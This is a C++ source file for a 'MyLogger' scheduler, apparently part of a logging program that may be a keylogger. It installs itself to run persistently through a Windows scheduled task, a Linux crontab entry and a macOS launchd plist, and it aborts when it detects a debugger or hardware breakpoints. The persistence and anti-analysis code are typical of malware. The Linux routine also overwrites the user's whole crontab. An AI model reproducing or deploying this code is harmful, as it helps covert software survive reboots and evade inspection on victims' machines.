#include "../include/scheduler.h"
#include "../include/antiDebug.h"

/**
 * @brief This method will schedule the logger task on Windows.
 * @return true, if the task was scheduled successfully.
 * @return false, if the task was not scheduled successfully.
 */
bool Scheduler::scheduleLoggerOnWindows()
{
#if defined(__WIN32) || defined(_WIN64)
    wchar_t moduleFileName[MAX_PATH];
    DWORD length = GetModuleFileNameW(NULL, moduleFileName, MAX_PATH);
    if (length == 0)
    {
        std::cerr << "Failed to get module file name." << std::endl;
        return false;
    }

    std::wstring exePath(moduleFileName);
    std::wstring exeDir = exePath.substr(0, exePath.find_last_of(L"\\"));

    ITaskScheduler* pITS = nullptr;
    HRESULT hr = CoCreateInstance(CLSID_CTaskScheduler, nullptr, CLSCTX_INPROC_SERVER, IID_ITaskScheduler, (void**)&pITS);
    if (FAILED(hr))
    {
        std::cerr << "Failed to get Task Scheduler service." << std::endl;
        return false;
    }

    ITask* pITask = nullptr;
    hr = pITS->NewWorkItem(L"MyLogger Task", CLSID_CTask, IID_ITask, (IUnknown**)&pITask);
    if (FAILED(hr))
    {
        pITS->Release();
        std::cerr << "Failed to create new task." << std::endl;
        return false;
    }

    IPersistFile* pIPF = nullptr;
    hr = pITask->QueryInterface(IID_IPersistFile, (void**)&pIPF);
    if (FAILED(hr))
    {
        pITask->Release();
        pITS->Release();
        std::cerr << "Failed to obtain IPersistFile interface." << std::endl;
        return false;
    }

    hr = pITask->SetApplicationName(moduleFileName);
    if (FAILED(hr))
    {
        pIPF->Release();
        pITask->Release();
        pITS->Release();
        std::cerr << "Failed to set application name." << std::endl;
        return false;
    }

    hr = pITask->SetWorkingDirectory(exeDir.c_str());
    if (FAILED(hr))
    {
        pIPF->Release();
        pITask->Release();
        pITS->Release();
        std::cerr << "Failed to set working directory." << std::endl;
        return false;
    }

    hr = pIPF->Save(NULL, TRUE);
    if (FAILED(hr))
    {
        pIPF->Release();
        pITask->Release();
        pITS->Release();
        std::cerr << "Failed to save task." << std::endl;
        return false;
    }

    pIPF->Release();
    pITask->Release();
    pITS->Release();

    std::cout << "Scheduled logger task successfully on Windows." << std::endl;
    return true;
#else
    return false;
#endif
}

/**
 * @brief This method will schedule the logger task on Linux. 
 * @return true, if the task was scheduled successfully.
 * @return false, if the task was not scheduled successfully.
 */
bool Scheduler::scheduleLoggerOnLinux()
{
#if defined(__linux__)
    char link[PATH_MAX];
    ssize_t ret = readlink("/proc/self/exe", link, sizeof(link) - 1);
    if (ret == -1)
    {
        std::cerr << "Failed to read symbolic link." << std::endl;
        return false;
    }
    link[ret] = '\0';

    std::string exePath(link);
    std::string exeDir = exePath.substr(0, exePath.find_last_of("/"));

    std::ofstream cronFile("/tmp/myLoggerCron");
    if (!cronFile.is_open())
    {
        std::cerr << "Failed to open cron file." << std::endl;
        return false;
    }

    cronFile << "0 8 * * * " << exePath << " >> /tmp/myLogger.log 2>&1" << std::endl;
    cronFile.close();

    int result = system("crontab /tmp/myLoggerCron");
    if (result != 0) {
        std::cerr << "Failed to install cron job." << std::endl;
        return false;
    }

    std::cout << "Scheduled logger task successfully on Linux." << std::endl;
    return true;
#else
    return false;
#endif
}

/**
 * @brief This method will schedule the logger task on MacOS.
 * @return true. if the task was scheduled successfully.
 * @return false, if the task was not scheduled successfully.
 */
bool Scheduler::scheduleLoggerOnMacOs()
{
#if defined(__APPLE__)
    char path[PATH_MAX];
    uint32_t size = sizeof(path);
    if (_NSGetExecutablePath(path, &size) != 0)
    {
        std::cerr << "Buffer too small; need size " << size << std::endl;
        return false;
    }

    std::string exePath(path);
    std::string exeDir = exePath.substr(0, exePath.find_last_of("/"));

    std::ofstream plistFile("/tmp/myLogger.plist");
    if (!plistFile.is_open())
    {
        std::cerr << "Failed to open plist file." << std::endl;
        return false;
    }

    plistFile << R"(<?xml version="1.0" encoding="UTF-8"?>)" << std::endl;
    plistFile << R"(<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">)" << std::endl;
    plistFile << "<plist version=\"1.0\">" << std::endl;
    plistFile << "<dict>" << std::endl;
    plistFile << "    <key>Label</key>" << std::endl;
    plistFile << "    <string>com.mycompany.myLogger</string>" << std::endl;
    plistFile << "    <key>ProgramArguments</key>" << std::endl;
    plistFile << "    <array>" << std::endl;
    plistFile << "        <string>" << exePath << "</string>" << std::endl;
    plistFile << "    </array>" << std::endl;
    plistFile << "    <key>RunAtLoad</key>" << std::endl;
    plistFile << "    <true/>" << std::endl;
    plistFile << "    <!-- Add more keys as needed -->" << std::endl;
    plistFile << "</dict>" << std::endl;
    plistFile << "</plist>" << std::endl;

    plistFile.close();

    int result = system("launchctl load /tmp/myLogger.plist");
    if (result != 0)
    {
        std::cerr << "Failed to load launchd plist." << std::endl;
        return false;
    }

    std::cout << "Scheduled logger task successfully on macOS." << std::endl;
    return true;
#else
    return false;
#endif
}

/**
 * @brief This method will start the scheduler.
 * @param schedule -> This is the flag to schedule the logger task.
 */
void Scheduler::start(bool schedule)
{
    AntiDebug ad;

    if (ad.isDebuggerPresent())
    {
        throw std::runtime_error("Debugger detected. Exiting.");
    }

    if (ad.checkForHardwareBreakpoints())
    {
        throw std::runtime_error("Hardware breakpoints detected. Exiting.");
    }

    bool scheduled = false;

#if defined(__WIN32) || defined(_WIN64)
    if (schedule)
    {
        scheduled = scheduleLoggerOnWindows();
    }
#elif defined(__linux__)
    if (schedule)
    {
        scheduled = scheduleLoggerOnLinux();
    }
#elif defined(__APPLE__)
    if (schedule)
    {
        scheduled = scheduleLoggerOnMacOs();
    }
#endif
}